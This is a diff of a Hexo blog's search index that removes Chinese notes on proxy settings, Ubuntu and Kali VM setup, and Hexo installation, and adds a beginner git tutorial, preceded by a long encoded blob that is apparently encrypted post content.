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 </div>]]></content>
-      <categories>
-        <category>杂记</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>网络代理设置</title>
-    <url>/2021/07/08/%E6%9D%82%E8%AE%B0/%E4%BB%A3%E7%90%86%E8%AE%BE%E7%BD%AE/</url>
-    <content><![CDATA[<h2 id="cmd-PowerShell代理设置"><a class="header-anchor" href="#cmd-PowerShell代理设置"></a>cmd/PowerShell代理设置</h2>
-<p>设置命令行代理（设置环境变量,命令行关闭后则失效）</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">set HTTP_PROXY=127.0.0.1:10809</span><br><span class="line">set HTTPS_PROXY=127.0.0.1:10809</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>ps：测试是否设置成功不要ping google，因为ping命令用的是ICMP协议；正确做法是</p>
-<p>curl <a href="http://www.google.com">www.google.com</a></p>
-</blockquote>
-<h2 id="git代理设置"><a class="header-anchor" href="#git代理设置"></a>git代理设置</h2>
-<p>设置永久有效</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git config --global https.proxy http://127.0.0.1:10809	</span><br><span class="line">git config --global https.proxy https://127.0.0.1:10809</span><br><span class="line">git config --global http.proxy 'socks5://127.0.0.1:10808'</span><br><span class="line">git config --global https.proxy 'socks5://127.0.0.1:10808'</span><br><span class="line">git config --global --list	#查询代理设置</span><br></pre></td></tr></table></figure>
-<h2 id="go代理设置"><a class="header-anchor" href="#go代理设置"></a>go代理设置</h2>
-<p>方法1.配置命令行环境变量（临时）</p>
-<p><strong>Bash (Linux or macOS)</strong></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export GOPROXY=https://goproxy.io,direct</span><br></pre></td></tr></table></figure>
-<p><strong>PowerShell (Windows)</strong></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">env:GOPROXY = <span class="string">"https://goproxy.io,direct"</span></span></span><br></pre></td></tr></table></figure>
-<p>方法2.配置用户环境变量</p>
-<p><strong>Mac/Linux</strong></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 设置你的 bash 环境变量</span></span><br><span class="line">echo "export GOPROXY=https://goproxy.io,direct" &gt;&gt; ~/.profile &amp;&amp; source ~/.profile</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 如果你的终端是 zsh，使用以下命令</span></span><br><span class="line">echo "export GOPROXY=https://goproxy.io,direct" &gt;&gt; ~/.zshrc &amp;&amp; source ~/.zshrc</span><br></pre></td></tr></table></figure>
-<p><strong>Windows</strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. 右键 我的电脑 -&gt; 属性 -&gt; 高级系统设置 -&gt; 环境变量</span><br><span class="line">2. 在 “[你的用户名]的用户变量” 中点击 ”新建“ 按钮</span><br><span class="line">3. 在 “变量名” 输入框并新增 “GOPROXY”</span><br><span class="line">4. 在对应的 “变量值” 输入框中新增 “https:&#x2F;&#x2F;goproxy.io,direct”</span><br><span class="line">5. 最后点击 “确定” 按钮保存设置</span><br></pre></td></tr></table></figure>
-<p>参考：<a href="https://blog.csdn.net/xiaobai_ol/article/details/106426199">https://blog.csdn.net/xiaobai_ol/article/details/106426199</a></p>
-]]></content>
-      <categories>
-        <category>杂记</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>Ubuntu (20.04)虚拟机安装配置</title>
-    <url>/2020/05/12/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/Ubuntu%20(20.04)%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/</url>
-    <content><![CDATA[<p>VMWare 安装Ubuntu系统时一般会默认使用简易安装，会有一个安装<code>open-vm-tools</code>的过程，如果在这里卡了很长时间，可以尝试关闭虚拟机再重新启动，完成安装过程</p>
-<h2 id="换源"><a class="header-anchor" href="#换源"></a>换源</h2>
-<p>Ubuntu安装好之后首先要做的就是换源，需要<strong>特别注意的一点</strong>是不要随便从一篇博客里复制粘贴源的地址到<code>sources.list</code>，因为每个不同版本的Ubuntu分别有自己的代号，源的链接是不同的，需要自己去官网找。</p>
-<h2 id="安装中文输入法"><a class="header-anchor" href="#安装中文输入法"></a>安装中文输入法</h2>
-<p>设置-&gt;区域和语言-&gt;管理已安装的语言</p>
-<p>弹出<code>语言支持</code>的窗口，选择<code>添加或删除语言</code>，找到中文简体，应用，然后设置<code>地区格式</code>，应用后关闭该窗口。</p>
-<p>回到<code>区域和语言</code>，设置<code>格式</code>为中国，然后注销，重新登陆，再次打开这个界面就可以添加中文输入法了。</p>
-]]></content>
-      <categories>
-        <category>环境配置</category>
-      </categories>
-      <tags>
-        <tag>linux</tag>
-        <tag>环境配置</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>kali(Debian)虚拟机的网络配置</title>
-    <url>/2020/04/23/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/kali(Debian)%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/</url>
-    <content><![CDATA[<h2 id="网卡配置"><a class="header-anchor" href="#网卡配置"></a>网卡配置</h2>
-<p>首先将虚拟机设置中的网络连接设置为<strong>桥接模式</strong>，这样虚拟网卡直接和宿主机的物理网卡桥接，这个虚拟机就可以视为和宿主机在同一局域网中（双绞线连接），方便将来的测试。</p>
-<img src="/2020/04/23/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/kali(Debian)%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/设置桥接模式.jpg" style="zoom:67%;">
-<p>然后打开虚拟网络编辑器，点击右下方的<strong>更改设置</strong></p>
-<img src="/2020/04/23/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/kali(Debian)%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/虚拟网络编辑器.jpg" style="zoom:67%;">
-<p>将红框部分改为你的物理网卡名称（可以在网络和共享中心-更改网络适配器中查看），如果找不到的话也可以保留<strong>自动</strong>选项，只不过这样的话后面如果把ip设置成静态的可能无法ping通外网。</p>
-<p>接下来进入虚拟机，<code>ifconfig</code>  查看IP地址，子网掩码，网关</p>
-<p><img src="/2020/04/23/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/kali(Debian)%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/ifconfig.jpg" alt></p>
-<p>然后配置网卡eth0</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;network&#x2F;interfaces</span><br></pre></td></tr></table></figure>
-<p>若要设置IP为静态的，则插入以下几行</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">auto eth0 #开机启动网卡</span><br><span class="line">iface eth0 inet static</span><br><span class="line">	address 192.168.xxx.xxx #上面查看的IP地址</span><br><span class="line">	broadcast 192.168.xxx.xxx #上面查看的网关地址</span><br><span class="line">	netmask 255.255.255.0</span><br></pre></td></tr></table></figure>
-<p>若设置为动态分配IP，则改为插入以下两行，这样设置重启后IP地址改变，需要自己注意</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">auto eth0</span><br><span class="line">iface eth0 inet dhcp</span><br></pre></td></tr></table></figure>
-<p><code>:wq</code>保存退出之后，重启网卡</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">service networking restart</span><br></pre></td></tr></table></figure>
-<p>然后<code>ping www.baidu.com</code>测试是否正常连接，再ping一下主机ip看是否成功。</p>
-<p>若主机能够ping通虚拟机，而虚拟机ping不通主机，则可能是被主机的防火墙拦截了，具体可以查看https://blog.csdn.net/hskw444273663/article/details/81301470</p>
-<p>到这里，主机和虚拟机能互相ping通，则网卡设置完成☺️</p>
-<h2 id="SSH配置"><a class="header-anchor" href="#SSH配置"></a>SSH配置</h2>
-<p>一般来说，kali默认已经安装了SSH</p>
-<p>首先查看SSH状态</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ps -e|grep ssh</span><br></pre></td></tr></table></figure>
-<p><img src="/2020/04/23/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/kali(Debian)%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/ssh%E7%8A%B6%E6%80%81.jpg" alt></p>
-<p>如图所示，表示ssh服务已启动，若没有，则尝试手动启动</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo service ssh start</span><br></pre></td></tr></table></figure>
-<p>然后修改sshd_config</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;ssh&#x2F;sshd_config</span><br></pre></td></tr></table></figure>
-<p>找到<code>#PasswordAuthentication no</code>,把注释去掉，再把no改成yes</p>
-<p>找到<code>#PermitRootLogin yes</code>,去掉注释</p>
-<p>保存退出。</p>
-<p>重启SSH服务</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">service ssh restart</span><br></pre></td></tr></table></figure>
-<p>要使ssh开机启动，命令为：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">update-re.d ssh enable</span><br></pre></td></tr></table></figure>
-<h2 id="代理设置"><a class="header-anchor" href="#代理设置"></a>代理设置</h2>
-<p>虚拟机想要连接外网，同样需要网络代理。如果宿主机已配置代理，那么直接让虚拟机连接主机代理上网即可。</p>
-<p>已<code>v2ray</code>为例，在参数设置-v2rayN设置中勾选<code>允许来自局域网的连接</code>。</p>
-<img src="/2020/04/23/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/kali(Debian)%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/image-20210320105308512.png" style="zoom:80%;">
-<p>确定保存后，在v2ray界面底部查看代理地址</p>
-<p><img src="/2020/04/23/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/kali(Debian)%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/image-20210320105508684.png" alt="image-20210320105508684"></p>
-<p>返回虚拟机，设置-网络-网络代理-手动，填写你的v2ray代理地址</p>
-<img src="/2020/04/23/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/kali(Debian)%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/image-20210320105106748.png" style="zoom:67%;">
-<p>最后设置浏览器代理为系统代理即可。</p>
-<p>开启主机代理之后，虚拟机访问所有网站都会经过主机的代理服务器，所以在访问国内网站时可能速度较慢。</p>
-]]></content>
-      <categories>
-        <category>环境配置</category>
-      </categories>
-      <tags>
-        <tag>linux</tag>
-        <tag>环境配置</tag>
-        <tag>kali</tag>
-        <tag>SSH</tag>
+        <tag>docker</tag>
       </tags>
   </entry>
   <entry>
@@ -707,67 +394,254 @@
       </tags>
   </entry>
   <entry>
-    <title>hexo博客搭建</title>
-    <url>/2020/04/07/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/hexo%20%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</url>
-    <content><![CDATA[<h2 id="安装配置-node-js"><a class="header-anchor" href="#安装配置-node-js"></a>安装配置 node.js</h2>
-<p><a href="https://www.jianshu.com/p/13f45e24b1de">https://www.jianshu.com/p/13f45e24b1de</a></p>
-<p><strong>npm to cnpm</strong></p>
-<p><a href="https://www.jianshu.com/p/115594f64b41">https://www.jianshu.com/p/115594f64b41</a></p>
-<h2 id="安装配置-Git"><a class="header-anchor" href="#安装配置-Git"></a>安装配置 Git</h2>
-<p><a href="https://blog.csdn.net/qq_29726869/article/details/88622840">https://blog.csdn.net/qq_29726869/article/details/88622840</a></p>
-<p>安装完成即可，没有必要配置ssh</p>
-<h2 id="安装-hexo"><a class="header-anchor" href="#安装-hexo"></a>安装 hexo</h2>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cnpm install -g hexo</span><br></pre></td></tr></table></figure>
-<p>建一个博客根目录，以管理员身份运行powershell并cd到博客根目录</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo init</span><br></pre></td></tr></table></figure>
+    <title>git</title>
+    <url>/2021/07/26/%E5%B7%A5%E5%85%B7/git/</url>
+    <content><![CDATA[<h2 id="总体概览"><a class="header-anchor" href="#总体概览"></a>总体概览</h2>
+<p>与svn等集中式版本控制系统不同，git为分布式版本控制系统，每个开发者都保存整个项目的完整镜像</p>
+<p><img src="/2021/07/26/%E5%B7%A5%E5%85%B7/git/211915189723300.jpg" alt="211915189723300.jpg"></p>
+<p>工作区间: 即我们创建的工程文件， 在编辑器可直观显示；</p>
+<p>缓存区: 只能通过git GUI或git shell 窗口显示，提交代码、解决冲突的中转站；</p>
+<p>本地仓库: 只能在git shell 窗口显示，连接本地代码跟远程代码的枢纽，不能联网时本地代码可先提交至该处；</p>
+<p>远程仓库: 即保存我们代码的服务器，本文以公共版本控制系统：github为例，登录github账号后可直观显示；</p>
+<h2 id="Git特点"><a class="header-anchor" href="#Git特点"></a>Git特点</h2>
+<p>1.直接记录快照，而非比较差异</p>
+<p>​	Git只关心文件数据的整体是否发生变化，而不是文件内容的具体差异。当文件整体发生变化时（比较指纹信息），则记录快照；若文件整体不变，则只保存上一版本快照的索引，避免重复存储。</p>
+<p>2.几乎所有操作都是本地执行</p>
+<p>​	Git中绝大多数操作都只需要访问本地文件和资源，不用联网。</p>
+<p>3.校验和（checksum）为文件的唯一标识</p>
+<p>​	一旦文件的完整性收到损坏，那么git就能立刻察觉到。</p>
+<p>4.多数操作仅添加数据</p>
+<p>​	常用的Git操作大多仅仅是把数据添加到数据库，因为任何一种不可逆的操作（如删除）都会使回退变得更加困难。</p>
+<p>5.文件的三种状态*</p>
+<p>​	对于任何一个文件，在Git中只有已提交（committed），已修改（modified）和已暂存（staged）三种状态。</p>
+<p>​	已提交表示该文件已经被安全地保存在本地数据库；</p>
+<p>​	已修改表示修改了某个文件，但还没有提交保存；</p>
+<p>​	已暂存表示把已修改的文件放在下次提交时要保存的清单中了</p>
+<h2 id="使用方法"><a class="header-anchor" href="#使用方法"></a>使用方法</h2>
+<h3 id="获得项目的Git仓库"><a class="header-anchor" href="#获得项目的Git仓库"></a>获得项目的Git仓库</h3>
+<h4 id="git-init"><a class="header-anchor" href="#git-init"></a>git init</h4>
+<p>要对现有的某个项目开始用 Git 管理，只需到此项目所在的目录，执行：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git init</span><br></pre></td></tr></table></figure>
+<p>初始化后，在当前目录下会出现一个名为 .git 的目录，所有 Git 需要的数据和资源都存放在这个目录中。不过目前，仅仅是按照既有的结构框架初始化好了里边所有的文件和目录，但我们还没有开始跟踪管理项目中的任何一个文件。</p>
+<p>如果当前目录下有几个文件想要纳入版本控制，需要先用 git add 命令告诉 Git 开始对这些文件进行跟踪，然后提交：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git add *.c		#把所有的c源码纳入版本控制（加入缓存区）</span><br><span class="line">git add README	#把README加入版本控制（加入缓存区）</span><br><span class="line">git commit -m 'initial project version'		#提交代码到本地仓库</span><br></pre></td></tr></table></figure>
+<h4 id="git-clone"><a class="header-anchor" href="#git-clone"></a>git clone</h4>
+<p>git clone用于从服务器上获取git仓库，并且获取的是项目历史的所有数据（每一个文件的每一个版本），服务器上有的数据克隆之后本地也都有了。实际上，即便服务器的磁盘发生故障，用任何一个克隆出来的客户端都可以重建服务器上的仓库，回到当初克隆时的状态。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone [url]</span><br></pre></td></tr></table></figure>
+<p>如果希望在克隆的时候，自己定义要新建的项目目录名称，可以在上面的命令末尾指定新的名字：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone git://github.com/schacon/grit.git mygrit</span><br></pre></td></tr></table></figure>
+<h3 id="状态检查"><a class="header-anchor" href="#状态检查"></a>状态检查</h3>
+<p><strong>查看当前项目的git状态</strong></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git status	# 在项目根目录下运行</span><br></pre></td></tr></table></figure>
+<p><strong>对比文件修改情况</strong></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git diff</span><br><span class="line">git diff --cached</span><br></pre></td></tr></table></figure>
+<p><code>git diff</code>命令比较的是工作目录中当前文件和暂存区域快照之间的差异，也就是修改之后还没有暂存起来的变化内容</p>
+<p>若要看已经暂存起来的文件和上次提交时的快照之间的差异，可以用 <code>git diff --cached</code>（Git 1.6.1 及更高版本还允许使用<code>git diff --staged</code>，效果是相同的，但更好记些。）</p>
+<p><strong>查看提交历史</strong></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git log [-p] [-2]</span><br><span class="line"><span class="meta">#</span><span class="bash"> -p 表示展开显示每次提交的内容差异，-2 表示仅展示最近的两次提交</span></span><br></pre></td></tr></table></figure>
+<p><a href="https://blog.csdn.net/bdss58/article/details/40537859">理解head和master</a></p>
+<h3 id="基础配置"><a class="header-anchor" href="#基础配置"></a>基础配置</h3>
+<p><strong>查看git配置信息</strong></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git config -l # 显示所有当前配置</span><br><span class="line">git config --global -l  # 显示所有全局配置</span><br><span class="line">git config --local -l  # 显示所有当前仓库独有配置</span><br><span class="line">git config --unset user.name # 删除 user.name 配置项</span><br></pre></td></tr></table></figure>
+<p><strong>配置远程地址</strong></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git remote add &lt;name&gt; &lt;url&gt;  # 添加远程地址，可添加多个</span><br><span class="line">git remote remove &lt;name&gt; # 删除远程地址</span><br></pre></td></tr></table></figure>
+<p><strong>记住密码</strong></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git config credential.helper store # 设置记住密码</span><br><span class="line">git config credential.helper 'cache --timeout 0' # 15min后清除密码</span><br></pre></td></tr></table></figure>
+<h3 id="工作区-缓存区"><a class="header-anchor" href="#工作区-缓存区"></a>工作区&lt;-&gt;缓存区</h3>
+<h4 id="git-add"><a class="header-anchor" href="#git-add"></a>git add</h4>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git add [options] [&lt;file&gt;…]</span><br></pre></td></tr></table></figure>
+<p><code>git add</code>是一个多功能命令，它可以将项目文件纳入跟踪范围，也可以将所做的修改暂存到暂存区，<code>git commit</code>只会把已加入暂存区的文件版本提交到本地仓库，所以每对项目文件做一次修改，都要使用git add命令将它加入暂存区，否则提交的可能就是修改之前的版本了。</p>
+<h4 id="gitignore"><a class="header-anchor" href="#gitignore"></a>.gitignore</h4>
+<p>一般我们总会有些文件无需纳入 Git 的管理，也不希望它们总出现在未跟踪文件列表。通常都是些自动生成的文件，比如日志文件，或者编译过程中创建的临时文件等。我们可以在项目根目录下创建如下一个名为 .gitignore 的文件，列出要忽略的文件模式</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 此为注释 – 将被 Git 忽略</span><br><span class="line">*.a       # 忽略所有 .a 结尾的文件</span><br><span class="line">!lib.a    # 但 lib.a 除外</span><br><span class="line">&#x2F;TODO     # 仅仅忽略项目根目录下的 TODO 文件，不包括 subdir&#x2F;TODO</span><br><span class="line">build&#x2F;    # 忽略 build&#x2F; 目录下的所有文件</span><br><span class="line">doc&#x2F;*.txt # 会忽略 doc&#x2F;notes.txt 但不包括 doc&#x2F;server&#x2F;arch.txt</span><br><span class="line">*.[oa]    # 忽略所有以 .o 或 .a 结尾的文件（编译过程文件）</span><br><span class="line">*~        # 忽略所有以波浪符 ~ 结尾的文件（文件副本）</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>文件 .gitignore 的格式规范如下：<br>
+所有空行或者以注释符号<code>＃</code>开头的行都会被 Git 忽略。<br>
+可以使用标准的 glob 模式匹配。<code> *</code> 匹配模式最后跟反斜杠<code>/</code>说明要忽略的是目录。<br>
+要忽略指定模式以外的文件或目录，可以在模式前加上叹号<code>!</code>取反</p>
+</blockquote>
+<h4 id="git-rm"><a class="header-anchor" href="#git-rm"></a>git rm</h4>
+<p><code>git rm &lt;filename&gt;</code>用来将不需要的文件同时从Git仓库和工作目录中删除，如果只是手动从工作目录中删除该文件，则还会在&quot;Changed but not updated&quot;中看到。</p>
+<p>如果希望在工作目录中保留文件，只从git仓库中删除，那么可以加上<code>--cached</code>参数</p>
+<blockquote>
+<p>误删文件恢复（回滚）</p>
+</blockquote>
+<h4 id="git-mv"><a class="header-anchor" href="#git-mv"></a>git mv</h4>
+<p>常用于文件移动和重命名</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git mv file_from file_to</span><br></pre></td></tr></table></figure>
+<h4 id="git-restore"><a class="header-anchor" href="#git-restore"></a>git restore</h4>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git restore &lt;file&gt;    # 丢弃工作区的修改（包括对文件自身的操作，如添加文件、删除文件）</span><br><span class="line">git restore --staged &lt;file&gt;    #将暂存区的修改重新放回工作区（包括对文件自身的操作，如添加文件、删除文件）</span><br></pre></td></tr></table></figure>
+<h3 id="缓存区-本地仓库"><a class="header-anchor" href="#缓存区-本地仓库"></a>缓存区&lt;-&gt;本地仓库</h3>
+<h4 id="git-commit"><a class="header-anchor" href="#git-commit"></a>git commit</h4>
+<p>一般使用<code>git comit -m &quot;your comment&quot;</code>将代码提交到本地仓库，提交后工作区清空，再次修改则需要重新<code>git add</code>，如果不加<code>-m</code>参数，那么会启动文本编辑器以输入本次提交的说明。</p>
+<p>每一次运行提交操作，都是对你项目作一次快照，以后可以回到这个状态，或者进行比较。</p>
+<p>尽管使用暂存区域的方式可以精心准备要提交的细节，但有时候这么做略显繁琐。Git 提供了一个跳过使用暂存区域的方式，只要在提交的时候，加上<code>-a</code> 选项，Git 就会自动把所有已经跟踪过的文件暂存起来一并提交，从而跳过 <code>git add</code> 步骤。</p>
+<h3 id="本地仓库-远程仓库"><a class="header-anchor" href="#本地仓库-远程仓库"></a>本地仓库&lt;-&gt;远程仓库</h3>
